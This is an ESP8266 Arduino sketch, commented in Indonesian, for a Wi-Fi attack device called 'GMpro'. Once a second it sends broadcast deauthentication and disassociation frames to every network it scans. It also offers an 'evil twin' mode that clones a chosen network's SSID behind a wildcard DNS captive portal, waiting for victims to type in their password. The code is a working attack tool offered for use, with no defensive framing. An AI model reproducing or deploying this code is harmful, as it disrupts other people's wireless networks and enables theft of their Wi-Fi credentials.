/* * PROJECT: GMpro Final Mod
 * STYLE: Hacker Matrix (Dark Mode)
 * FEATURES: Auto Mass Deauth, Evil Twin, Max Signal Range
 */

#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>

// --- FIX AGAR DEAUTH BERFUNGSI DI ARDUINODROID ---
extern "C" {
  #include "user_interface.h"
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);
}

typedef struct {
  String ssid;
  uint8_t ch;
  uint8_t bssid[6];
} _Network;

_Network _networks[16];
_Network _selectedTarget;
const byte DNS_PORT = 53;
DNSServer dnsServer;
ESP8266WebServer webServer(80);

bool evil_twin_active = false;
unsigned long deauth_timer = 0;
unsigned long scan_timer = 0;

// STYLE TAMPILAN GMPRO
String style = "<style>body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding:10px;}"
               ".box{border:1px solid #0f0;padding:15px;margin-bottom:10px;border-radius:5px;}"
               "a{background:#0f0;color:#000;padding:5px;text-decoration:none;font-weight:bold;display:inline-block;margin-top:10px;}</style>";

void setup() {
  Serial.begin(115200);
  
  // --- SIGNAL BOOST MAKSIMAL ---
  // WiFi.setOutputPower(20.5); 
  
  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1); 

  // --- IDENTITAS ALAT ---
  WiFi.softAPConfig(IPAddress(192,168,4,1), IPAddress(192,168,4,1), IPAddress(255,255,255,0));
  WiFi.softAP("GMpro", "sangkur87");
  
  dnsServer.start(DNS_PORT, "*", IPAddress(192,168,4,1));

  // PANEL KONTROL
  webServer.on("/", []() {
    String html = "<html><head><meta name='viewport' content='width=device-width'>" + style + "</head><body>";
    html += "<h1>[ GMPRO-SYSTEM ]</h1>";
    
    if(evil_twin_active) {
      html += "<div class='box' style='color:yellow'>MODE: EVIL TWIN ACTIVE<br>TARGET: " + _selectedTarget.ssid + "</div>";
      html += "<p>Menunggu korban input password...</p>";
      html += "<a href='/stop' style='background:red;color:white'>STOP ATTACK</a>";
    } else {
      html += "<div class='box'>MASS DEAUTH: <span style='color:red'>ATTACKING ALL</span></div><hr>";
      for(int i=0; i<16; i++) {
        if(_networks[i].ssid != "") {
          html += "<div class='box'>" + _networks[i].ssid + " [Ch:" + String(_networks[i].ch) + "]<br><a href='/start?id=" + String(i) + "'>CLONE SSID (EVIL TWIN)</a></div>";
        }
      }
    }
    html += "</body></html>";
    webServer.send(200, "text/html", html);
  });

  webServer.on("/start", []() {
    int id = webServer.arg("id").toInt();
    _selectedTarget = _networks[id];
    evil_twin_active = true;
    WiFi.softAPdisconnect(true);
    WiFi.softAP(_selectedTarget.ssid.c_str()); // Wemos ganti nama jadi target
    webServer.send(200, "text/html", "Target Locked. Cloning SSID...");
  });

  webServer.on("/stop", []() {
    evil_twin_active = false;
    WiFi.softAPdisconnect(true);
    WiFi.softAP("GMpro", "sangkur87");
    webServer.send(200, "text/html", "Attack Stopped. Returning to GMpro.");
  });

  webServer.begin();
  performScan();
}

void performScan() {
  int n = WiFi.scanNetworks();
  for (int i = 0; i < n && i < 16; ++i) {
    _networks[i].ssid = WiFi.SSID(i);
    _networks[i].ch = WiFi.channel(i);
    memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
  }
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();

  // --- LOGIKA SERANGAN DEAUTH (INTI) ---
  if (!evil_twin_active && (millis() - deauth_timer >= 1000)) {
    for (int i = 0; i < 16; i++) {
      if (_networks[i].ssid != "" && _networks[i].ssid != "GMpro") {
        
        wifi_set_channel(_networks[i].ch);

        // Paket Deauth (C0) & Disassociate (A0)
        uint8_t pkt[26] = {0xC0, 0x00, 0x37, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00};
        
        memcpy(&pkt[10], _networks[i].bssid, 6);
        memcpy(&pkt[16], _networks[i].bssid, 6);
        
        // Kirim serangan
        wifi_send_pkt_freedom(pkt, 26, 0); 
        pkt[0] = 0xA0; 
        wifi_send_pkt_freedom(pkt, 26, 0); 
        delay(1); 
      }
    }
    deauth_timer = millis();
  }

  // Scan ulang setiap 30 detik agar daftar WiFi update
  if (!evil_twin_active && (millis() - scan_timer >= 30000)) {
    performScan();
    scan_timer = millis();
  }
}
